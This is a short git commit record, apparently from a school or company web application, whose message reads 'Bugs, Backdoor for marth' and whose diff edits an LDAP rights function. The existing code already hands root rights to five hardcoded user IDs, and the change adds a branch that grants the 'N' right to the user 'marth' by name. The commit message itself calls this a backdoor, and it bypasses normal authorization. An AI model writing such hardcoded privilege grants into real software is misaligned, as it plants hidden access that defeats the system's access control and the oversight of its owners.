818d8b4d0492ee48a9c8e3c942084781e042df1b
Marco Handle <handle.marco@tele2.at>
2014-02-25 18:16:08 +0100

    Bugs, Backdoor for marth

--- modules/general/LDAP.php
+++ modules/general/LDAP.php
@@ -109,6 +109,8 @@
 			//         Buchberger           Handle               Klotz                Weiland              Machac
 			if ($cn == "20090319" || $cn == "20090334" || $cn == "20090340" || $cn == "20090396" || $cn == "20090359")
 				$rightArray['root'] = true;
+			else if($cn == "marth")
+				$rightArray['N']=true;
 			
 		}
 		return $rightArray;
